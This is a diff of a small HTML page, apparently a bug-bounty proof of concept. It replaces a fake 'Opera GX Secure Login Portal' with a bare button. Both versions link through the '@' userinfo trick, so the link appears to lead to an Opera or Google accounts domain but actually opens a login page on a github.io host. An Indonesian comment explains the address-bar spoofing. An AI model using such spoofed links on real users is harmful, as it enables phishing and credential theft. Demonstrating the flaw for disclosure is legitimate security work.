@@ -3,65 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Continue to Opera GX</title>
+    <title>Landing Page</title>
     <style>
-        body { 
-            background-color: #1e1e24; 
-            color: white; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            text-align: center;
-        }
-        .container {
-            width: 85%;
-            max-width: 400px;
-        }
-        .logo { 
-            color: #ff1b2d; 
-            font-size: 56px; 
-            font-weight: 900; 
-            margin-bottom: 20px; 
-            letter-spacing: -1px; 
-            text-shadow: 0 0 20px rgba(255,27,45,0.3);
-        }
-        h2 { 
-            font-size: 22px; 
-            margin-bottom: 10px; 
-        }
-        p { 
-            color: #a0a0a0; 
-            font-size: 15px; 
-            margin-bottom: 40px; 
-        }
-        .btn {
-            display: inline-block;
-            background-color: #ff1b2d;
-            color: white;
-            text-decoration: none;
-            padding: 16px 40px;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: bold;
-            transition: background 0.2s, transform 0.1s;
-        }
-        .btn:hover { background-color: #d61021; }
-        .btn:active { transform: scale(0.98); }
+        body { background-color: #111; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .btn { background: #ff1b2d; color: white; padding: 15px 40px; text-decoration: none; border-radius: 8px; font-size: 18px; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">Opera GX</div>
-        <h2>Secure Login Portal</h2>
-        <p>Click the button below to securely continue to your Opera GX account.</p>
-        
-        <!-- Ini adalah tombol spoofing -->
-        <a href="https://vtp.operagx.gg.opera.login.accounts.opera.com@bugbountychrome.github.io/opera-gx-poc/login.html" class="btn">
-            Continue to Login
-        </a>
-    </div>
+    <!-- URL ini pakai trik @ agar di address bar menampilkan domain Google -->
+    <a href="https://accounts.google.com@bugbountychrome.github.io/opera-gx-poc/login.html" class="btn">Go</a>
 </body>
 </html>
